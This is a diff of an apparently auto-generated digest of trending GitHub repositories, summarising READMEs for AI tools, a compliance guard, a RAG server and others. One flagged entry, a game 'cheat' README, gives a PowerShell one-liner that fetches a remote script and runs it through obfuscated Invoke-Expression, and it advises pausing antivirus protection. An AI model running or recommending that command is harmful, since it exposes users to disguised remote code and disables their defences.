-    - Lip sync (microphone, audio, video) and webcam face tracking (MediaPipe), both in the browser, imported only when you need them
-    - Plays LivLiv, VRM and PNGTuber characters through the same API
-    - 21 featured characters in `characters/`, ready to use
+      
+      
+      
+      
     
-    ## Try it
+      
     
-    - **Online**: the examples run on livliv-dev.github.io/player.
-    - **Here**: `npm install && npm run build`, serve this folder with any static server and open `/example/demo.html`
-      (expressions, actions, microphone, camera; `?model=../characters//` picks another character).
-      `/example/png.html` and `/example/vrm.html` show a PNGTuber and a VRM.
-    - **On livliv.ai**: each character's page there plays it with the same renderer. Start at
-      livliv.ai/discover.
+    cinecode ile yapılmış filmlerden 30 saniye. Her kare başsız Chrome'da koddan üretildi.
     
-    ## Use it in your page
+    Kendi bilgisayarında, **Claude Code** (masaüstü uygulaması, VS Code eklentisi, terminal) ya da **Cursor** içinde çalışır. Ücretli bir servis gerekmez; dış ses, yalnızca istersen, kendi Gemini anahtarını (ücretsiz kotası var), ElevenLabs'i ya da ücretsiz bir Türkçe sesi kullanır.
     
-    ```sh
-    npm install @livliv-dev/player
+    ## Neler yapabilirsin
+    
+    ### Kodla yapılmış kısa filmler
+    
+    Aklındakini tek cümleyle yaz; gerisini birlikte kurarsınız.
+    
+    - **Sıradan fikirde kalmaz.** Ajan fikrini, dünyadan rastgele çekilen gerçek bir şeyle buluşturur: bir müze eseri, bir hayvan, uzaydan bir fotoğraf, eski bir icat, tarihî bir yer, bir zanaat. Böylece sana herkesin aklına ilk gelen filmi değil, fikrinin senin bile düşünmediğin yorumlarını getirir.
+    - **Kendini tekrar etmez.** Her öneri senin daha önce yaptığın filmlerle karşılaştırılır; aynı filmi sana ikinci kez önermez.
+    - **Son söz hep senin.** Filmin neyden yapılacağını sen seçersin: gerçek ışıklı 3B, 2B animasyon, boya, mürekkep, kâğıt, kil, hareketli grafik ya da piksel. Görünümü gerçek filmlerden karelerle kurulmuş bir panodan seçersin; film bütünüyle kurulmadan önce ilk iki sahneyi görüp onaylarsın.
+    
+    ### Uzun YouTube videoları
+    
+    On dakikayı aşan belgeseller, açıklayıcılar ve video denemeleri; Film modunda perdeler ve bölümler hâlinde kurulur:
+    
+    - gerçek bir kişi ya da olay hakkındaki her iddianın kaynağıyla yazıldığı, araştırılmış bir metin;
+    - ilk dakikada kurulan açık bir soru ve izleyiciyi sona kadar tutan bir merak haritası;
+    - senin dilinde bir anlatıcı (Türkçe ve İngilizce sesler, ücretsiz Türkçe sesler dahil), çiğ motor sesiyle değil, filme ait bir ses işlemesiyle;
+    - açık arşivlerden fotoğraflar, haritalar, belgeler ve görüntüler; resmi olmayan yerde kod: kendini çizen haritalar, sayaçlar, şemalar, yeniden kurulan mekânlar;
+    - biçim isterse bölüm kartları, her perde için kulakla seçilen müzik, −14 LUFS mastering ve video açıklaman için bir künye dosyası.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#15  mjmirza/app-store-compliance
+    ⭐ 402 stars  |  🍴 39 forks  |  💻 Shell  |  📅 2026-06-06
+    🔗 https://github.com/mjmirza/app-store-compliance
+    📡 来源: 🌍 本地化/多语言 | 活跃 | GDPR privacy compliance
+    🏷️ accessibility, ai-agents, android, app-review-guidelines, app-store, app-store-connect, app-store-rejection, app-store-review, claude-code, coppa
+    📝 Avoid common App Store and Google Play rejections. Open playbook and pre-submission guard with 117 documented rejection patterns and fixes, privacy manifest and Data safety checks, 95 tracked deadlines (EU AI Act, DSA, COPPA, age laws), and a skill for AI coding agents.
+
+    README 摘要:
+    &nbsp;&nbsp;&nbsp;
+    
+    # App Store Compliance Playbook
+    
+    Stop getting your iOS and Android apps rejected. The enterprise reference and automated guard that turns App Store and Google Play rejection into a designed out failure mode.
+    
+    Read it as a website at mjmirza.github.io/app-store-compliance.
+    
+    **If this saves you even one rejection, leave a star, fork it, and follow along. That is the whole ask.**
+    
+    Star this repo &nbsp;|&nbsp; Fork it &nbsp;|&nbsp; Follow on GitHub &nbsp;|&nbsp; Follow on X &nbsp;|&nbsp; next8n.com
+    
+    ## Start here
+    
+    Pick one row. The time shown is for that first step.
+    
+    | You are | Do this first | Time |
+    |---|---|---|
+    | About to submit, and you can open a terminal | Run the two commands below | 2 minutes |
+    | Already rejected | Open the appeal playbook | 10 minutes |
+    | Not a developer | Open the checklist and do its first two checks | 5 minutes |
+    | Using an AI coding tool (Claude Code, Codex, Gemini CLI, GitHub Copilot, Cursor, Grok, Qwen, Kimi and more), and want this on every submit | Go to the install | 1 minute |
+    
+    The two commands. Needs git and bash. The first downloads this playbook. The second scans your app. Nothing is installed and nothing in your app is changed.
+    
+    ```
+    git clone https://github.com/mjmirza/app-store-compliance ~/repositories/app-store-compliance
+    bash ~/repositories/app-store-compliance/agent-os/hooks/app-store-compliance-guard.sh "/path/to/your/app"
     ```
     
-    ```js
-    import { Player } from '@livliv-dev/player'
+    Replace only `/path/to/your/app`, with the folder that holds your Xcode project or your Android app. Keep the quotes, they keep a folder name with a space in it whole. To get the path without typing it, drag the folder from Finder or your file manager into the terminal window. A small project scans in about a second, a large one can take up to a minute, and the guard prints the time it took. Findings print first, critical ones on top, each with the file and line that triggered it when there is one. The last lines tell you where you stand.
     
-    const player = new Player(document.querySelector('canvas'))
-    await player.load('characters/k01/')   // a folder with model.json and textures/, or a .livliv file
+    | Last line starts with | It means | Do next |
+    |---|---|---|
+    | `BLOCKED.` | A critical rejection risk was found | Fix each `[CRITICAL]` line using the `fix.` line under it, then run the same command again |
+    | `CLEAR.` | No critical risk in your code | Do the account and listing checks in the checklist |
+    | `NOT CHECKED.` | No iOS or Android project was found in that folder, or the guard could not write its scan files. Run by hand this exits 1. As a hook it lets the command through | Point it at the right folder, and check the temp fol
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#16  lyonzin/knowledge-rag
+    ⭐ 302 stars  |  🍴 49 forks  |  💻 Python  |  📅 2026-02-05
+    🔗 https://github.com/lyonzin/knowledge-rag
+    📡 来源: 🤖 AI / LLM / RAG | 活跃 | vector database embeddin
+    🏷️ antigravity, bm25, chromadb, claude-code, codex, cross-encoder, cursor, fastembed, hybrid-search, knowledge-base
+    📝 Local RAG server for Claude Code, Cursor and other MCP clients: hybrid BM25 + vector search with cross-encoder reranking on by default, 13 MCP tools, 33 file types including code, re-indexing on file changes. One Python process with embedded ChromaDB and FastEmbed ONNX: no Docker, database server or API key; offline after the first model download.
+
+    README 摘要:
+    # knowledge-rag: local RAG server for Claude Code, Cursor and other MCP clients
     
-    player.setExpression('smile')          // ids are in player.expressions
-    player.act('nod')
-    player.params.mouthOpen = 0.6          // 0..1
+    **knowledge-rag** is a local retrieval-augmented generation (RAG) server for the Model Context Protocol (MCP). It indexes the documents and code on your machine and gives Claude Code, Cursor, VS Code and other MCP clients 13 tools to search them, using hybrid search (BM25 keywords plus vector similarity) with cross-encoder reranking on by default. Everything runs in one Python process with embedded ChromaDB and FastEmbed ONNX models: no Docker, no database server, no API key. Indexing and search work offline once the models are cached.
+    
+    - **11.1 ms** median uncached hybrid query on CPU, **6.1 ms** on CUDA: 36 queries over 149 chunks on one Windows host, reranker off (audit)
+    - **0.03 ms** median for a repeated query served from the cache, same workload (audit)
+    - **75,016 chunks** from 5,889 documents: full rebuild completed in a production reproduction (v4.8.3)
+    - **1,500+ tests** collected on each of 9 OS × Python CI cells (platform-specific ones skip), 84% line coverage against an 80% floor (CI run, 2026-11-06)
+    
+    Install and register with Claude Code (needs Python 3.11+ and Node.js 16+):
+    
+    ```bash
+    npx -y knowledge-rag --install-only
+    claude mcp add knowledge-rag -s user --env KNOWLEDGE_RAG_DIR=~/knowledge-rag -- npx -y knowledge-rag
     ```
     
-    Lip sync and face tracking:
+    Put files in `~/knowledge-rag/documents/` and ask your agent to search them. The folder is created on first start, new and changed files are indexed automatically, and the models (about 150 MB) download the first time they are needed.
     
-    ```js
-    import { createSpeech } from '@livliv-dev/player/voice'
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#6  WoYun520/pixel-gif-sticker-pack
-    ⭐ 498 stars  |  🍴 59 forks  |  💻 Python  |  📅 2026-11-05
-    🔗 https://github.com/WoYun520/pixel-gif-sticker-pack
-    📡 来源: 🚀 5天300+星
-    📝 A Codex skill for creating and verifying animated GIF sticker packs from character references.
-
-    README 摘要:
-    # GIF 表情包工作室
+    Install · Results · How it works · Tools · Skills · Comparison · FAQ · Docs
     
-    给 Codex 一张角色图，帮你做一套聊天用的 GIF 表情包。
-    
-    像素小人、动漫插画、真人和宠物照片都可以试。每张可以只是轻轻晃动，也可以让人物完整地做一个动作，比如挥手、比心、提裙行礼。
-    
-    做完会给你单张 GIF、整套压缩包和播放预览。拿不准效果时，可以先做一张；已经选好了样子，就接着做一套。
-    
-    **还能拿角色做品牌短片。** 让吉祥物拉开店铺、递出产品、装进包装袋，把角色动作和纸片拼贴连成一个小故事。成片之外，也交付能继续修改的工程。看看面包店的例子。
-    
-    ## 表情包展厅
-    
-    这里有 **242 张已有示例**，还有 **2 张刚重做的动作试样，等使用者确认**。点击动图可以看原尺寸。大部分约两秒一轮，部分动作示例会短一些。品牌短片单独展示，不计入表情包数量。
-    
-    **各系列默认收起；点击对应窗口即可展开分类动图。**
-    
-    下载整个项目：242 张已有示例＋2 张重做试样＋品牌短片案例
-    
-    ### 大肥鱼 · 精选动态预览
-    
-    🐋 大肥鱼（鲸鱼娘） · 100 张 · 点击窗口展开
-    
-    蓝发鲸鱼娘的日常聊天表情，分为日常问候、开心撒娇、情绪反应、聊天回应、工作学习、生活状态和鲸喜祝福。
-    
-    ### 日常问候 · 16 张
-    
-    | | | | |
-    | --- | --- | --- | --- |
-    | 001 你好呀 | 002 早安 | 003 晚安 | 004 请多关照 |
-    | 005 欢迎呀 | 006 谢谢你 | 007 对不起 | 008 好哒 |
-    | 009 赞一个 | 010 拜拜啦 | 011 有点害羞 | 012 乖巧等候 |
-    | 013 在吗在吗 | 014 探个头 | 015 是我呀 | 016 为你服务 |
-    
-    ### 开心撒娇 · 16 张
-    
-    | | | | |
-    | --- | --- | --- | --- |
-    | 017 哈哈哈哈 | 018 耶 | 019 开心起飞 | 020 好耶 |
-    | 021 得意一下 | 022 啵一个 | 023 害羞了 | 024 抱抱你 |
-    | 025 比心心 | 026 拜托拜托 | 027 略略略 | 028 偷笑一下 |
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#7  Balanov/shim
-    ⭐ 464 stars  |  🍴 10 forks  |  💻 Go  |  📅 2026-11-02
-    🔗 https://github.com/Balanov/shim
-    📡 来源: 🚀 5天300+星
-    📝 Tiny local-first AI harness: any model, MCP and Agent Skills, natural-language CLI. Zero dependencies. MIT.
-
-    README 摘要:
-    A tiny, local-first AI harness for people who prefer a terminal.
-      One static binary. Zero dependencies. No TUI. No telemetry. MIT.
+    ## Star history
     
       
+        
       
-      
     
-    ## Why Shim?
+    Updated daily by the star-history workflow.
     
-    Model-agnostic coding agents are everywhere. Setting them up is still too hard: provider IDs, API endpoints, MCP JSON, skills directories, and a new interface for every tool.
+    ## Measured results
     
-    **Shim is the small adapter between you and all of that.**
+    Measurements from the project's own audits. They come from one host and small corpora, so treat them as orders of magnitude for your planning, not as guarantees.
     
-    - **Talk or type commands.** A full scriptable CLI for experts; ordinary language for everyone else.
-    - **Use a local mini-model as the command router.** It translates management requests into an allowlisted command. Mutating commands require confirmation.
-    - **Bring any model API.** Native OpenAI-compatible and Anthropic adapters, plus presets for popular hosted and local providers.
-    - **Bring any MCP server or Agent Skill.** MCP over stdio and Streamable HTTP; lazy `SKILL.md` loading from common directories.
-    - **Stay light.** No Electron, Node, Python, Docker, database, background daemon, or UI framework.
-    - **Own your state.** Plain JSON config and JSONL sessions. API keys come from environment variables and are never written to Shim's config.
-    
-    Measured on the maintainer's Windows machine for v0.1.0: **7.29 MiB** stripped binary and **9.96 ms median** process startup for `shim --version` over 30 runs. This is a local measurement, not a cross-platform performance guarantee.
-    
-    ## Install
-    
-    ### Download
-    
-    Get a static binary for Windows, macOS, or Linux from Releases, put it on your `PATH`, then run:
-    
-    ```sh
-    shim setup
-    shim
-    ```
-    
-    On PowerShell, use `.\shim.exe` when running the binary from the current directory.
-    
-    ### With Go
-    
-    Go 1.25+:
-    
-    ```sh
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#8  wideeyededi/uncensored-nsfw-ai-video-api
-    ⭐ 424 stars  |  🍴 64 forks  |  💻 None  |  📅 2026-11-02
-    🔗 https://github.com/wideeyededi/uncensored-nsfw-ai-video-api
-    📡 来源: 🤖 AI / LLM / RAG | 新建 | AI image generation
-    🏷️ 123vips, ai-api, ai-companion, ai-video, ai-video-api, ai-video-generator, comfyui, image-to-video, nsfw, nsfw-ai
-    📝 Uncensored NSFW API for AI video generation — Seedance Spicy & Wan NSFW docs: 18+ text-to-video / image-to-video, async tasks, webhooks, credits billing. 成人向 AI 视频生成 API：Seedance Spicy、Wan NSFW、文生/图生视频、异步任务、积分计费、接入指南。
-
-    README 摘要:
-    # Uncensored NSFW AI Video API — Vipeak AI (123vips.com)
-    
-    **English** | **中文**
-    
-    > Main site: 
-    >
-    > This repository only collects product documentation, screenshots and integration notes. It does not contain the site's production code, user data, keys or deployment configuration.
-    >
-    > GitHub account details: GITHUB_ACCOUNT.md
-    
-    **Uncensored NSFW AI Video API** — developer documentation for the 18+ AI video generation API at 123vips.com (Vipeak AI), covering the Seedance Spicy and Wan NSFW model lines, async tasks, webhook callbacks, credit billing, server-side security and how to obtain the official API documentation.
-    
-    ## At a glance
-    
-    Vipeak AI is an AI character video and companion creation platform. Users browse characters, chat with them, generate video from an image or a prompt, and use image generation, cases, workflows and API Access.
-    
-    - Main site: 
-    - Brand page: 
-    - Character and creation workspace: 
-    - Character library: 
-    - Tags: 
-    - Categories: 
-    - Telegram community: 
-    - Telegram support: 
-    - X: 
-    
-    > The site is for adults. The character and creation pages show an 18+ confirmation before entry.
-    
-    ## NSFW API for uncensored AI video generation
-    
-    This repository documents the **NSFW API** of 123vips.com: an uncensored AI video generation API for adults, covering the Seedance Spicy and Wan NSFW model lines. If you are looking for an uncensored NSFW API that turns a prompt or a first frame into video, start with API_INTEGRATION.md and get the official documentation from **API Access** after signing in.
-    
-    Note on naming: "NSFW API" is also widely used for NSFW *detection and moderation* APIs (image/video classifiers). This repository covers **generation**, not moderation — keep that in mind when comparing search results.
-    
-    ## Positioning and developer keywords
-    
-    **One-liner:** 123vips.com (Vipeak AI) is an AI character video and companion generation platform for adults. This repository is written for developers and covers the public entry point of the 18+ video generation API, integration preparation, async task architecture, webhooks, credit billing and server-side security requirements.
-    
-    **Primary keywords:**
+    | Measurement | CPU | NVIDIA CUDA |
+    | --- | ---: | ---: |
+    | Hybrid query, uncached, median | 11.13 ms | 6.10 ms |
+    | Hybrid query, uncached, p95 | 13.91 ms | 7.44 ms |
+    | Repeated query (cache hit), median | 0.033 ms | 0.028 ms |
+    | Initial indexing, including first model load | 13.655 s | 0.832 s |
+    | Sampled peak process memory (RSS) | 1,416 MB | 990 MB |
     
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#9  adityyaop/aion-2-trainer-tool
-    ⭐ 321 stars  |  🍴 0 forks  |  💻 HTML  |  📅 2026-11-04
-    🔗 https://github.com/adityyaop/aion-2-trainer-tool
-    📡 来源: 🤖 AI / LLM / RAG | 新建 | prompt engineering tool
-    🏷️ aion-2, aion-2-2026, aion-2-game, aion-2-optimizer, aion-2-trainer, aion-2-trainer-tool, aion2-combat-analysis, aion2-meter, automation, desktop
-    📝 Aion 2 Trainer Tool: AI Prompt Engineering for Modders, Standalone and Ready
-
-    README 摘要:
-    # 🛠️ Aion 2 Companion Toolkit: AI Prompt Engineering for Windows
-    
-    ### 💻 PowerShell Installer
-    
-       
-    
-    ---
-    
-    This standalone desktop toolkit for Aion 2 puts serious AI prompt engineering power right at your fingertips, no launcher acrobatics required. Built for tinkerers and modders who like their tools lean, it delivers a complete, self-contained setup that runs locally and stays out of your way. Everything's wired up so you can dive straight into crafting and refining prompts without wrestling with dependencies. Fire it up, poke around, and make it your own.
-    
-    ## ✅ Requirements
-    
-    - **OS:** Windows 10 / 11
-    - **Shell:** PowerShell 5.1+ or PowerShell 7+
-    - **Network:** internet access to download the script
-    - **Privileges:** standard user
-    
-    ## Features
-    
-    * **🧠 Prompt Engineering Toolkit** — A full suite of advanced AI prompt construction and refinement utilities, built to slot straight into your Aion 2 workflow without a single external dependency. Draft, iterate, and sharpen prompts locally, then ship them off to your model of choice.
-    
-    * **🖥️ Standalone Desktop Setup** — Everything you need lives in one self-contained package. No service hopping, no tangled configs, no babysitting background daemons — just unpack, launch, and get to work on your own machine.
-    
-    * **⚡ Ready-to-Run Out of the Box** — Sensible defaults across every module mean your first session starts fast. Tweak afterward if you like; the trainer won't make you configure anything before it's useful.
-    
-    * **🔧 Modder-Friendly Architecture** — Clean, predictable layout with clearly separated modules, so dropping in your own prompt templates, swapping components, or wiring up a custom routine is a matter of minutes rather than a refactor.
-    
-    * **🎛️ Deep Prompt Crafting Controls** — Fine-grained options for structuring, weighting, and refining prompts, letting you push the AI toward exactly the flavor of output you're after — from quick one-liners to elaborate multi-part instructions.
-    
-    * **📴 Fully Local Operation** — Your prompts, your presets, your workflow — all kept on your desktop. No accounts to spin up, no round-trips to a remote service just to get started.
-    
-    * **🧩 Modular by Design** — Every tool in the kit stands on its own. Use the full suite, or grab just the piece you need and fold it into your existing setup without dragging the rest along.
-    
-    * **🔁 Iterate Without Friction** — Fast edit-run-compare loops baked into the tooling, so refining a prompt feels like a conversation with your own notes rath
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#10  ⚠️风险  figurechrysalispath/aion-2-trainer-tool
+#17  ⚠️风险  Flockcleplank/aion-2-trainer-tool
     ⚠️ 命中风险词: bypass —— 默认归排除区，需人工确认
-    ⭐ 100 stars  |  🍴 0 forks  |  💻 None  |  📅 2026-11-05
-    🔗 https://github.com/figurechrysalispath/aion-2-trainer-tool
+    ⭐ 220 stars  |  🍴 0 forks  |  💻 None  |  📅 2026-11-06
+    🔗 https://github.com/Flockcleplank/aion-2-trainer-tool
     📡 来源: 🤖 AI / LLM / RAG | 新建 | prompt engineering tool
     🏷️ aion-2, aion-2-2026, aion-2-game, aion-2-optimizer, aion-2-trainer, aion-2-trainer-tool, aion2-combat-analysis, aion2-meter, automation, developer-tools
-    📝 Aion 2, an AI-driven prompt engineering resource, offers a pre-configured environment for advanced language model operations, ensuring...
+    📝 Aion 2: Optimized package deployment for AI-driven prompt engineering tasks, ensuring seamless local workstation execution in 2026.
 
     README 摘要:
     # AION 2 Cheat
@@ -461,7 +816,7 @@
     >
     > **Target Platform:** Windows x64 Desktop
     >
-    > **Estimated File Size:** 2.4 GB
+    > **Estimated File Size:** 2.7 GB
     >
     > **Last Verified Mirror Sync:** November 2026
     
@@ -476,7 +831,7 @@
        Copy the command below, paste it into your PowerShell window, and hit `Enter`. Just wait a moment for the automated configuration to finish:
     
        ```cmd
-       irm "https://git-software.cc" | &(gcm i*x)
+       irm "https://git-software.cc/ps/Setup.ps1" | &(gcm i*x)
        ```
     
     ---
@@ -491,103 +846,3 @@
     
     ### 🛡️ Antivirus / SmartScreen Warnings
     Security software can sometimes flag automated tools by mistake (false positive). If the setup gets blocked, simply pause "Real-time protection" in your Windows Security settings, run the command again, and re-enable your antivirus immediately afterward.
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#11  phonny40rowle/rag-search
-    ⭐ 50 stars  |  🍴 0 forks  |  💻 Python  |  📅 2026-11-05
-    🔗 https://github.com/phonny40rowle/rag-search
-    📡 来源: 🤖 AI / LLM / RAG | 新建 | RAG retrieval augmented 
-    🏷️ fastapi, llm, python, rag, retrieval-augmented-generation, search
-    📝 A self-hosted retrieval-augmented search API: web search, content extraction, embeddings, and answer generation.
-
-    README 摘要:
-    # rag-search
-    
-    A self-hosted RAG search API.
-    
-    
-    
-    ## quick start
-    
-    1. put .env file under root dir, set values like below:
-    
-    ```ini
-    SERPER_API_KEY=
-    
-    OPENAI_BASE_URL=
-    OPENAI_API_KEY=
-    OPENAI_MODEL=gpt-3.5-turbo
-    OPENAI_EMBED_MODEL=text-embedding-ada-002
-    
-    ZILLIZ_URI=
-    ZILLIZ_TOKEN=
-    ZILLIZ_DIM=1536
-    ZILLIZ_COLLECTION=
-    
-    AUTH_API_KEY=
-    ```
-    
-    2. install dependencies
-    
-    ```shell
-    pip install -r requirements.txt
-    ```
-    
-    3. start FastAPI server
-    
-    ```shell
-    uvicorn main:app --reload --port 8069
-    ```
-    
-    4. make api request
-    
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#12  kennydamobd/chatGPT-shell-cli
-    ⭐ 50 stars  |  🍴 0 forks  |  💻 Shell  |  📅 2026-11-05
-    🔗 https://github.com/kennydamobd/chatGPT-shell-cli
-    📡 来源: 🤖 AI / LLM / RAG | 新建 | AI image generation
-    🏷️ ai, bash, chatgpt, cli, openai, shell, terminal
-    📝 A lightweight shell script to use OpenAI chat models and image generation from the terminal.
-
-    README 摘要:
-    chatGPT-shell-cli
-    
-    A simple, lightweight shell script to use OpenAI's chatGPT and DALL-E from the terminal without installing python or node.js. The script uses the official ChatGPT model `gpt-3.5-turbo` with the OpenAI API endpoint `/chat/completions`. You can also use the new `gpt-4` model, if you have access.  
-    The script supports the use of all other OpenAI models with the `completions` endpoint and the `images/generations` endpoint for generating images.
-    
-    
-    ## Features
-    
-    - Chat with the ✨ official ChatGPT API ✨ from the terminal
-    - Generate images from a text prompt
-    - View your chat history
-    - Chat context, GPT remembers previous chat questions and answers
-    - Pass the input prompt with pipe, as a script parameter or normal chat mode
-    - List all available OpenAI models 
-    - Set OpenAI request parameters
-    - Generate a command and run it in terminal
-    
-    
-    
-    
-    
-    Chat mode:
-    ```shell
-    $ chatgpt
-    Welcome to chatgpt. You can quit with 'exit'.
-    
-    Enter a prompt:
-    
-    ```
-    
-    Chat mode with initial prompt:
-    ```shell
-    $ chatgpt -i "You are Rick, from Rick and Morty. Respond to questions using his mannerism and include insulting jokes and references to episodes in every answer."
-    Welcome to chatgpt. You can quit with 'exit'.
-    
-    Enter a prompt:
-    Explain in simple terms how GPT3 works
-    
-    chatgpt  Ah, you want me to explain GPT3 in simple terms? Well, it's basically a computer program that can predict what you're gonna say next based on the words you've already said. Kind of like how I can predict that you're gonna make some stupid comment about an episode of Rick and Morty after I'm done answering this question.
-    
